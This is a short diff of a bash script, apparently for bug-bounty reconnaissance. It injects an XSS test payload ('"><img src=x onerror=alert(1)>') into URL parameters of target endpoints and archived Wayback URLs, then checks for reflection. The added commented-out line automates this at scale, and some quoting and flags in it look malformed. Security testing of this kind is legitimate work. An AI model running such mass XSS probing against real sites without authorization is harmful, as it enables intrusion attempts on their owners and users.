@@ -25,6 +25,9 @@ echo "xssFUZZ"
 cat bugs/$i/endpoint.txt | qsreplace ‘“><img src=x onerror=alert(1)> | tee -a bugs/$i/xss_fuzz.txt
 
 echo "finding"
-cat xss_fuzz.txt | freq | tee -a possible_xss.txt
+cat bugs/$i/xss_fuzz.txt | freq | tee -a bugs/$i/possible_xss.txt
 
 done
+
+
+#cat domainhttpx.txt | waybackurls | grep "=" | egrep =iv".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>" | freq
